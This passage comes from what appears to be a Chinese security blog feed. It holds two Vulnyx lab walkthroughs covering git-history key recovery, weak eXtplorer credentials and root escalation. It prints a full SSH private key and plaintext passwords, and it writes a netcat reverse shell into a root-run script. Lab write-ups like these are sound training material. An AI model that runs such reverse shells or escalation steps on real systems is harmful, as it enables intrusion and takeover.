--&gt;<br></code></pre></td></tr></table></figure><p>进行登录，找到ssh的账号和密码：<code>developer:SummerVibes2024!</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601061036357.png"></p><h1 id="三、获取developer权限"><a href="#三、获取developer权限" class="headerlink" title="三、获取developer权限"></a>三、获取developer权限</h1><p>使用获取到的凭证进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# ssh developer@192.168.2.33                                  <br>developer@alpine:~$ <span class="hljs-built_in">id</span><br>uid=1000(developer) gid=1000(developer) <span class="hljs-built_in">groups</span>=1000(developer)<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="1、获取sysadmin权限"><a href="#1、获取sysadmin权限" class="headerlink" title="1、获取sysadmin权限"></a>1、获取sysadmin权限</h2><p>查看<code>/home/developer/README.txt</code>，提示我们使用<code>git</code>进行部署的<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601061040568.png"></p><p>查看<code>/home/sysadmin/</code>发现存在<code>.git</code>泄露</p><h3 id="1-Git泄露"><a href="#1-Git泄露" class="headerlink" title="1-Git泄露"></a>1-Git泄露</h3><ol><li><p>查看git的日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">developer@alpine:~$ git <span class="hljs-built_in">log</span> <br>commit 0c6ee270764eb91ee53afc9784881371d4dddd93 (HEAD -&gt; master)<br><br>diff --git a/.ssh-backup/id_rsa b/.ssh-backup/id_rsa<br>commit 0c6ee270764eb91ee53afc9784881371d4dddd93 (HEAD -&gt; master)<br>Author: sysadmin &lt;sysadmin@snowpeak.nyx&gt;<br>Date:   Thu Dec 11 11:14:27 2025 +0000<br><br>    Remove backup<br><br>commit 02f9a1879dbfa40703a6bcbd985e5a19542c24c8<br>Author: sysadmin &lt;sysadmin@snowpeak.nyx&gt;<br>Date:   Thu Dec 11 11:13:53 2025 +0000<br><br>    Backup SSH keys before server migration<br><br>commit 2823ba92f4fdee9b5d71e74f9f060a5d5ed3b593<br>Author: sysadmin &lt;sysadmin@snowpeak.nyx&gt;<br>Date:   Thu Dec 11 11:13:26 2025 +0000<br><br>    Initial commit: Add database config<br></code></pre></td></tr></table></figure><p>找到三个镜像：<code>0c6ee270764eb91ee53afc9784881371d4dddd93</code>、<code>02f9a1879dbfa40703a6bcbd985e5a19542c24c8</code>和<code>2823ba92f4fdee9b5d71e74f9f060a5d5ed3b593</code></p></li><li><p>查看镜像内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">developer@alpine:~$ git show 02f9a1879dbfa40703a6bcbd985e5a19542c24c8<br>diff --git a/.ssh-backup/id_rsa b/.ssh-backup/id_rsa<br>new file mode 100644<br>index 0000000..76b357a<br>--- /dev/null<br>+++ b/.ssh-backup/id_rsa<br>@@ -0,0 +1,27 @@<br>+-----BEGIN OPENSSH PRIVATE KEY-----<br>+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn<br>+NhAAAAAwEAAQAAAQEA3ZnZAOyE5gZN5QxDnRnYnRfXHwCavg4mJz2HbUWI7p3lGi+tdL6u<br>+IbqPyjqbH69DcyQCubvORi4domdpqTchLF7PyJlUBHVIo3AULC1kVhMqGvctWQxAgPRvr7<br>+zM7HGr+NpTPEkM/4BjfJToy706FGjfiXBhjkSiv5cHOlnXxhO44NkKSxvySnXkmYq3PNNF<br>+5OtjZJg+7+XrZKoUsaipupjOcZgsQCx1Yf1xE4gWIi/jS9kY07R0GtNdqaW2Z9UwXYGMFW<br>+xGKPtczHbRgcxtdP9ne71C/Zh5zsTPtgWWx8cO+P0N0emTYNDEMlD+4IH9AygBbnAzY978<br>+qc2jiRSxJwAAA8jbDUur2w1LqwAAAAdzc2gtcnNhAAABAQDdmdkA7ITmBk3lDEOdGdidF9<br>+cfAJq+DiYnPYdtRYjuneUaL610vq4huo/KOpsfr0NzJAK5u85GLh2iZ2mpNyEsXs/ImVQE<br>+dUijcBQsLWRWEyoa9y1ZDECA9G+vvMzscav42lM8SQz/gGN8lOjLvToUaN+JcGGORKK/lw<br>+c6WdfGE7jg2QpLG/JKdeSZirc800Xk62NkmD7v5etkqhSxqKm6mM5xmCxALHVh/XETiBYi<br>+L+NL2RjTtHQa012ppbZn1TBdgYwVbEYo+1zMdtGBzG10/2d7vUL9mHnOxM+2BZbHxw74/Q<br>+3R6ZNg0MQyUP7ggf0DKAFucDNj3vypzaOJFLEnAAAAAwEAAQAAAQAlkP0uoOnurMbru2aC<br>+7WzBRNddFBcnfPKO2Glq5szN1sqN4+M91U1jvmK9362Ic4e1rzcfEW1ojEzNyUYqP4RKJ1<br>+CGKygJEXDc9BUXYCKQTPNoWtq/K8qLkeSVICaFNsf2idxubdvcPIGhDwVf9JYx+41ZmUmQ<br>+eqY0YIADLlPb6g8z0Cgr0cEQg9PEBUi5FZAhji0hIz9k7BAfAzBaed94y+IPF0gG8AtsRm<br>+oo9XlqTuiphbkNyTVPzE9mKoqR8pECqSLAcx5+YBFP6tOoKh1BwHqWBG5ixw3fWi2HvgPv<br>+WeVRTozvXzjP1fVlYi/KyayuOLuiwQrlWvtkXwB4S3cRAAAAgEoibXJoCwzdf1naZQ4yZr<br>+aHnU5Mkx1XsO3X2bWXdIRZzQuLjAlmbwjQyMRWkiRb12D2uc1LwwQ1lzlBOqnCRXjFpM28<br>+/M8V6ZwYMP5bJeOGJSKEaikzY7blksM2Pls2P8zuhLiL3DnvQlB/7whKfME2MwH4tBDYTO<br>+7mS6MbKIElAAAAgQD1zPzaJsyt7gAjYgn/v0Wzj7HfVlLqeLR8TGup5MP8uDq6IJV5pLkf<br>+S8I4dGTOfrhgTw4VNbwy/BZNZErVnKa+zt6EsHgSqFub5ZVgpwRWx6bkk7lKPikZ62uNye<br>+gtqE7uJVBu12Li4kWuzyF2/IhcSh1Sp9B7fnF6p5b+t1H84wAAAIEA5svMbW9WTDB5hvgo<br>+ii5H6OZuIPGNKeEndKVquBeLjKR2QQrK9KQ0d/OgIu4ioEOmQ+NA1tWKr5uXJ4hdBvDCoS<br>+4tqjiIBNSTx1qkV6tpcbKDaIjTzdCvAJ8wOMymShOVVJkmXvgIsJuydR7OQ+StvR0DRDGp<br>+rkFejyhcyFIbke0AAAARc3lzYWRtaW5Ac25vd3BlYWsBAg==<br>+-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>找到存在的ssh私钥</p></li></ol><p>处理一下私钥，得到正确的私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAQEA3ZnZAOyE5gZN5QxDnRnYnRfXHwCavg4mJz2HbUWI7p3lGi+tdL6u<br>IbqPyjqbH69DcyQCubvORi4domdpqTchLF7PyJlUBHVIo3AULC1kVhMqGvctWQxAgPRvr7<br>zM7HGr+NpTPEkM/4BjfJToy706FGjfiXBhjkSiv5cHOlnXxhO44NkKSxvySnXkmYq3PNNF<br>5OtjZJg+7+XrZKoUsaipupjOcZgsQCx1Yf1xE4gWIi/jS9kY07R0GtNdqaW2Z9UwXYGMFW<br>xGKPtczHbRgcxtdP9ne71C/Zh5zsTPtgWWx8cO+P0N0emTYNDEMlD+4IH9AygBbnAzY978<br>qc2jiRSxJwAAA8jbDUur2w1LqwAAAAdzc2gtcnNhAAABAQDdmdkA7ITmBk3lDEOdGdidF9<br>cfAJq+DiYnPYdtRYjuneUaL610vq4huo/KOpsfr0NzJAK5u85GLh2iZ2mpNyEsXs/ImVQE<br>dUijcBQsLWRWEyoa9y1ZDECA9G+vvMzscav42lM8SQz/gGN8lOjLvToUaN+JcGGORKK/lw<br>c6WdfGE7jg2QpLG/JKdeSZirc800Xk62NkmD7v5etkqhSxqKm6mM5xmCxALHVh/XETiBYi<br>L+NL2RjTtHQa012ppbZn1TBdgYwVbEYo+1zMdtGBzG10/2d7vUL9mHnOxM+2BZbHxw74/Q<br>3R6ZNg0MQyUP7ggf0DKAFucDNj3vypzaOJFLEnAAAAAwEAAQAAAQAlkP0uoOnurMbru2aC<br>7WzBRNddFBcnfPKO2Glq5szN1sqN4+M91U1jvmK9362Ic4e1rzcfEW1ojEzNyUYqP4RKJ1<br>CGKygJEXDc9BUXYCKQTPNoWtq/K8qLkeSVICaFNsf2idxubdvcPIGhDwVf9JYx+41ZmUmQ<br>eqY0YIADLlPb6g8z0Cgr0cEQg9PEBUi5FZAhji0hIz9k7BAfAzBaed94y+IPF0gG8AtsRm<br>oo9XlqTuiphbkNyTVPzE9mKoqR8pECqSLAcx5+YBFP6tOoKh1BwHqWBG5ixw3fWi2HvgPv<br>WeVRTozvXzjP1fVlYi/KyayuOLuiwQrlWvtkXwB4S3cRAAAAgEoibXJoCwzdf1naZQ4yZr<br>aHnU5Mkx1XsO3X2bWXdIRZzQuLjAlmbwjQyMRWkiRb12D2uc1LwwQ1lzlBOqnCRXjFpM28<br>/M8V6ZwYMP5bJeOGJSKEaikzY7blksM2Pls2P8zuhLiL3DnvQlB/7whKfME2MwH4tBDYTO<br>7mS6MbKIElAAAAgQD1zPzaJsyt7gAjYgn/v0Wzj7HfVlLqeLR8TGup5MP8uDq6IJV5pLkf<br>S8I4dGTOfrhgTw4VNbwy/BZNZErVnKa+zt6EsHgSqFub5ZVgpwRWx6bkk7lKPikZ62uNye<br>gtqE7uJVBu12Li4kWuzyF2/IhcSh1Sp9B7fnF6p5b+t1H84wAAAIEA5svMbW9WTDB5hvgo<br>ii5H6OZuIPGNKeEndKVquBeLjKR2QQrK9KQ0d/OgIu4ioEOmQ+NA1tWKr5uXJ4hdBvDCoS<br>4tqjiIBNSTx1qkV6tpcbKDaIjTzdCvAJ8wOMymShOVVJkmXvgIsJuydR7OQ+StvR0DRDGp<br>rkFejyhcyFIbke0AAAARc3lzYWRtaW5Ac25vd3BlYWsBAg==<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>查看私钥的用户，得到属于<code>sysadmin</code>用户的私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh-keygen -y -f <span class="hljs-built_in">id</span>                                         <br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdmdkA7ITmBk3lDEOdGdidF9cfAJq+DiYnPYdtRYjuneUaL610vq4huo/KOpsfr0NzJAK5u85GLh2iZ2mpNyEsXs/ImVQEdUijcBQsLWRWEyoa9y1ZDECA9G+vvMzscav42lM8SQz/gGN8lOjLvToUaN+JcGGORKK/lwc6WdfGE7jg2QpLG/JKdeSZirc800Xk62NkmD7v5etkqhSxqKm6mM5xmCxALHVh/XETiBYiL+NL2RjTtHQa012ppbZn1TBdgYwVbEYo+1zMdtGBzG10/2d7vUL9mHnOxM+2BZbHxw74/Q3R6ZNg0MQyUP7ggf0DKAFucDNj3vypzaOJFLEn sysadmin@snowpeak<br></code></pre></td></tr></table></figure><p>进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh -i <span class="hljs-built_in">id</span> sysadmin@192.168.2.33<br>sysadmin@alpine:~$ <span class="hljs-built_in">id</span><br>uid=1001(sysadmin) gid=1001(sysadmin) <span class="hljs-built_in">groups</span>=1001(sysadmin)<br></code></pre></td></tr></table></figure><h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>在<code>/opt/script</code>下面找到脚本<code>cleanup.sh</code>，查看文件权限，发现该文件使用root权限运行，同时sysadmin用户具有可写权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysadmin@alpine:/opt/scripts# <span class="hljs-built_in">ls</span> -la cleanup.sh <br>-rwxrwxr-x    1 root     sysadmin       287 Jan  6 02:30 cleanup.sh<br></code></pre></td></tr></table></figure><p>那么尝试写入提取命令到<code>cleanup.sh</code>进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysadmin@alpine:/opt/scripts# <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;nc 192.168.2.4 4444 -e /bin/bash&#x27;</span> &gt; cleanup.sh<br></code></pre></td></tr></table></figure><p>开启监听，等待一段时间，成功获取到root的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.33] 35945<br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)<br></code></pre></td></tr></table></figure><h1 id="五、查看FLAG"><a href="#五、查看FLAG" class="headerlink" title="五、查看FLAG"></a>五、查看FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/root.txt /home/developer/user.txt<br>6b75b087f12ed42f124d68493469a493<br>30a0cf321ff0c0997f45a7202490b260<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Vulnyx</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息泄露</tag>
      
      <tag>git泄露</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Explorer</title>
    <link href="/Vulnyx/Explorer/"/>
    <url>/Vulnyx/Explorer/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li><a href="https://vulnyx.com/file/Explorer.php">https://vulnyx.com/file/Explorer.php</a></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/vulnyx/explorer]<br>└─# nmap -sn 192.168.2.0/24               <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 16:15 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00047s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00032s latency).<br>MAC Address: 08:00:27:EA:4D:3E (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.11<br>Host is up (0.00089s latency).<br>MAC Address: 08:00:27:09:E6:80 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.21 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.11</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/vulnyx/explorer]<br>└─# nmap --min-rate 10000 -p- 192.168.2.11                                                      <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 16:16 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.11<br>Host is up (0.00067s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:09:E6:80 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 6.23 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/vulnyx/explorer]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.11<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 16:16 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.11<br>Host is up (0.00061s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)<br>| ssh-hostkey: <br>|   256 a9:a8:52:f3:<span class="hljs-built_in">cd</span>:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)<br>|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)<br>80/tcp open  http    Apache httpd 2.4.65 ((Debian))<br>|_http-server-header: Apache/2.4.65 (Debian)<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">| http-robots.txt: 1 disallowed entry </span><br><span class="hljs-string">|_/extplorer</span><br><span class="hljs-string">MAC Address: 08:00:27:09:E6:80 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 8.79 seconds</span><br></code></pre></td></tr></table></figure><ol><li><strong>22端口：</strong> ssh服务，用于远程登录</li><li><strong>80端口：</strong> http服务，存在<code>robots.txt</code>文件</li></ol><h3 id="3-UDP端口扫描"><a href="#3-UDP端口扫描" class="headerlink" title="3.UDP端口扫描"></a>3.UDP端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/vulnyx/explorer]<br>└─# nmap -sU --top-ports 100 192.168.2.11                    <br><br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 16:17 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.11<br>Host is up (0.00094s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:09:E6:80 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 105.00 seconds<br></code></pre></td></tr></table></figure><p>没有开放的端口</p><h1 id="二、80端口测试"><a href="#二、80端口测试" class="headerlink" title="二、80端口测试"></a>二、80端口测试</h1><p>访问80端口，是服务的默认页面，没有什么东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/vulnyx/explorer]<br>└─# curl http://192.168.2.11    <br>&lt;html&gt;<br>&lt;body&gt;<br>  &lt;h1&gt;It works!&lt;/h1&gt;<br>  &lt;p&gt;This is the default web page <span class="hljs-keyword">for</span> this server.&lt;/p&gt;<br>  &lt;p&gt;The web server software is running but no content has been added, yet.&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>根据上面信息收集到的信息，访问<code>/robots.txt</code>文件，找到目录<code>extplorer</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/vulnyx/explorer]<br>└─# curl http://192.168.2.11/robots.txt<br>User-agent: *<br>Disallow: /extplorer<br></code></pre></td></tr></table></figure><h1 id="三、extplorer测试"><a href="#三、extplorer测试" class="headerlink" title="三、extplorer测试"></a>三、extplorer测试</h1><p>访问<code>extplorer</code>，发现是<code>extplorer</code>文件管理器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">eXtplorer 是一个基于 php 的文件管理器，通过web页面进行操作，操作方式与本地电脑上的资源管理器很像，其主要作用是在本地电脑与服务器之间传送文件，并且能和本地电脑的资源管理器一样，对文件和目录进行编辑、复制、移动和删除等操作，甚至还能修改文件的权限属性。<br></code></pre></td></tr></table></figure><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509141645724.png"></p><h2 id="1、弱口令"><a href="#1、弱口令" class="headerlink" title="1、弱口令"></a>1、弱口令</h2><p>直接尝试<code>admin:admin</code>，发现成功登录<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509141646097.png"></p><h2 id="2、敏感信息泄露"><a href="#2、敏感信息泄露" class="headerlink" title="2、敏感信息泄露"></a>2、敏感信息泄露</h2><p>直接查找到<code>extplorer/config/conf.php</code>文件，找到一个<code>root</code>的账号和密码<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509141648591.png"></p><h1 id="四、获取root权限"><a href="#四、获取root权限" class="headerlink" title="四、获取root权限"></a>四、获取root权限</h1><p>直接使用获取到的账号和密码<code>root:AccessGranted#1</code>进行登录，成功获得<code>root权限</code></p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">┌──(root㉿kali)-[~/miaosec/vulnyx/explorer]<br>└─# ssh root@<span class="hljs-number">192.168</span>.<span class="hljs-number">2.11</span><br>The authenticity <span class="hljs-keyword">of</span> host <span class="hljs-comment">&#x27;192.168.2.11 (192.168.2.11)&#x27; can&#x27;t be established.</span><br>ED25519 <span class="hljs-keyword">key</span> fingerprint <span class="hljs-built_in">is</span> SHA256:<span class="hljs-number">4</span>K6G5c0oerBJXgd6BnT2Q3J+i/dOR4+<span class="hljs-number">6</span>rQZf20TIk/U.<br>This <span class="hljs-keyword">key</span> <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> known <span class="hljs-keyword">by</span> any other names.<br>Are you sure you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">continue</span> connecting (yes/no/[fingerprint])? yes<br><span class="hljs-symbol">Warning:</span> Permanently added <span class="hljs-comment">&#x27;192.168.2.11&#x27; (ED25519) to the list of known hosts.</span><br>root@<span class="hljs-number">192.168</span>.<span class="hljs-number">2.11</span><span class="hljs-comment">&#x27;s password: </span><br>root@explorer:~# id<br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) grupos=<span class="hljs-number">0</span>(root)<br></code></pre></td></tr></table></figure><h1 id="五、获取FLAG"><a href="#五、获取FLAG" class="headerlink" title="五、获取FLAG"></a>五、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@explorer:~# <span class="hljs-built_in">cat</span> /home/user.txt /root/root.txt <br>3f2580ab16ac82c9e0adaf0dad3a900d<br>9a045d36c5a28f01784bdcfb326accfe<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Vulnyx</category>
      
    </categories>
    
    
    <tags>
      
      <tag>extplorer`文件管理器</tag>
      
      <tag>弱口令</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Motto</title>
    <link href="/Hackmyvm/Motto/"/>
    <url>/Hackmyvm/Motto/</url>
    
